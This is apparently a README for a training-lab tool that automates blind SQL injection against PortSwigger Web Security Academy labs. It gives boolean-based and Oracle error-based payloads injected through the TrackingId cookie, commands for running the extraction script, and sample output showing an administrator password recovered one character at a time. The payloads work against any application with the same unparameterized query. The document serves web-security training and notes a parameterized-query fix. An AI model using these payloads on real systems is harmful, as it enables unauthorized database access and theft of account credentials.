# 10 - Blind SQL Injection (Boolean-Based & Error-Based)

## Purpose
Extract sensitive data from a database when query results are not returned directly, using either a conditional response oracle ("Welcome back") or an error oracle (HTTP 500) to infer values one character at a time.

## Lab Context
**Platform**: PortSwigger Web Security Academy  
**Lab types**:
- Blind SQLi with conditional responses → use `--mode boolean`
- Blind SQLi with conditional errors → use `--mode error`

This skill does **not** require discovery phase JSON files. It operates directly against a lab URL with a valid session cookie.

## How It Works

The application embeds the `TrackingId` cookie value in a SQL query without parameterization. Since results are never returned in the response, extraction relies on side-channel inference.

### Boolean mode (`--mode boolean`)
Injects a true/false condition and checks for "Welcome back" in the response body:
```
TrackingId=<id>' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1)='{char}'--
```
- Response contains "Welcome back" → condition is true → character matches

### Error mode (`--mode error`)
Forces a divide-by-zero error when the condition is true, using Oracle's `TO_CHAR(1/0)` and string concatenation:
```
TrackingId=<id>'||(SELECT CASE WHEN (SUBSTR(password,{pos},1)='{char}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')--
```
- HTTP 500 → condition is true → character matches
- HTTP 200 → condition is false → try next character

### DB dialect (`--db`)
Controls which substring function is used:

| `--db`       | Function used  |
|--------------|----------------|
| `postgresql` | `SUBSTRING`    |
| `mysql`      | `SUBSTRING`    |
| `mssql`      | `SUBSTRING`    |
| `oracle`     | `SUBSTR`       |

## Setup

1. **Open the lab** in your browser
2. **Grab both cookies** from DevTools → Application → Cookies: `session` and `TrackingId`
3. **Copy the lab URL** (e.g. `https://LABID.web-security-academy.net/`)

## Commands

**Boolean mode (PostgreSQL lab — default):**
```bash
python3 scripts/10_blind_sqli.py \
  --url https://LABID.web-security-academy.net/ \
  --session <session_value> \
  --tracking-id <TrackingId_value>
```

**Error mode (Oracle lab):**
```bash
python3 scripts/10_blind_sqli.py \
  --url https://LABID.web-security-academy.net/ \
  --session <session_value> \
  --tracking-id <TrackingId_value> \
  --mode error \
  --db oracle
```

## Expected Output

```
[*] Target : https://LABID.web-security-academy.net/filter?category=Gifts
[*] Mode   : boolean
[*] DB     : postgresql
[*] Extracting administrator password (30 chars max)...

  Position 01: s  →  s
  Position 02: e  →  se
  Position 03: c  →  sec
  ...
  Position 16: 4  →  secret1234abc5d34

[*] No match at position 17 — extraction complete.

[+] Password: secret1234abc5d34
```

## Vulnerable vs. Safe

**Boolean mode — vulnerable (true condition):**
```
HTTP/2 200 OK   +   "Welcome back" in body
```

**Error mode — vulnerable (true condition):**
```
HTTP/2 500 Internal Server Error
```

**Patched app (either mode):**  
Parameterized queries prevent the injected SQL from being evaluated — the condition can never fire.

## Safety Notes

- **Sandboxed lab only** — for PortSwigger labs and authorized engagements only
- Not for use against real targets without explicit written authorization
- The lab resets on expiry; grab fresh cookie values if requests start failing
- No rate limiting needed for PortSwigger labs, but add `time.sleep(0.1)` if you hit connection errors

## Execution Time

~3–8 minutes depending on password length (worst case: 30 positions × 36 chars = 1080 requests).

## Next Step

After retrieving the password, log in as `administrator` via the lab's `/login` endpoint to confirm the finding and complete the lab.
